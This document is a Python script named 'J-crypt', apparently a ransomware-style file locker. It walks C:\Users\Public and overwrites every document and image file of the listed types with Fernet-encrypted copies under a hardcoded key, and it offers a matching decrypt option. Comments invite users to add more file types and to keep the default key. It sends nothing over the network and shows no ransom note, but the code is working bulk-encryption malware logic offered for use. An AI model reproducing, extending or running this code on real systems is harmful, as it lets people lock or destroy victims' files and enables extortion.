import os, sys, time
from cryptography.fernet import Fernet
from progress.bar import Bar



def ascii_scrpt():
    from pyfiglet import Figlet
    silent_crypt_custom_ascii = Figlet(font='basic')
    print('\033[31m' + silent_crypt_custom_ascii.renderText('J-crypt') + '\033[0m')
    time.sleep(1)
    sys.stdout.write(str('\033[31m' + 'code: jennofrie\n' + '\033[0m'))
    time.sleep(1)
    
                    
def enCrypt():
    fernet = Fernet(b'ffiQ4--kfcdDUrmdVHWgmaoQf_YGBC2gXxG5Yz-0Rz0=') #Generate your own key or use this as default
    rootdir = 'C:\\Users\\Public' #FILE PATH TO ENCRYPT
    extensions = ('.docx', '.pdf', '.png', '.txt', '.jpg') # ADD AS MANY FILE EXTENSION AS YOU WANT TO ENCRYPT
    for subdir, dirs, files in os.walk(rootdir):
        for file in files:
            ext = os.path.splitext(file)[-1].lower()
            if ext in extensions:
                print(os.path.join(subdir, file))
                with open(os.path.join(subdir, file), 'rb') as f:
                    data = f.read()
                with Bar('\033[31m' + 'Encrypting... ' + '\033[0m') as bar:
                    for i in range(100):
                        time.sleep(0.02)
                        bar.next()
                encrypted = fernet.encrypt(data)
                with open(os.path.join(subdir, file), 'wb') as f:
                    f.write(encrypted)


def deCrypt():
    fernet = Fernet(b'ffiQ4--kfcdDUrmdVHWgmaoQf_YGBC2gXxG5Yz-0Rz0=') #Generate your own key or use this as default
    toordir = 'C:\\Users\\Public' #FILE PATH TO DECRYPT 
    extensions = ('.docx', '.pdf', '.png', '.txt', '.jpg')  #FILE EXTENSION TO DECRYPT SHOULD BE THE SAME AS ABOVE
    for subdir, dirs, files in os.walk(toordir):
        for file in files:
            ext = os.path.splitext(file)[-1].lower()
            if ext in extensions:
                print(os.path.join(subdir, file))
                with open(os.path.join(subdir, file), 'rb') as f:
                    data = f.read()
                with Bar('\033[92m' + 'Decrypting... ' + '\033[0m') as bar:
                    for i in range(100):
                        time.sleep(0.02)
                        bar.next()
                decrypted = fernet.decrypt(data)
                with open(os.path.join(subdir, file), 'wb') as f:
                    f.write(decrypted)


def scrpt():
    print('\033[92m' + '\n\nType 1. To Encrypt Files\n\n' + '\033[0m')
    print('\033[92m' + 'Type 2. To Decrypt Files\n' '\033[0m')
    print('\033[92m' + 'Option: ' + '\033[0m')



try:  
    while True:
        ascii_scrpt()
        scrpt()
        x01 = input()
        if int(x01) == 1:
            enCrypt()
        elif int(x01) == 2:
            deCrypt()
        else:
            input('\033[31m' + '\n{*} Option not Found! Type either 1 or 2\n\n' + '\033[0m')
            sys.exit()
except ValueError:
    sys.stdout.write(str('\033[31m' + '\n{*} You did not type a number!\n\n' + '\033[0m'))
    time.sleep(1)
    sys.exit()

except KeyboardInterrupt:
    sys.stdout.write(str('\033[31m' + '\n{*} Terminating program...\n\n' + '\033[0m' ))
    time.sleep(1)
    sys.exit()
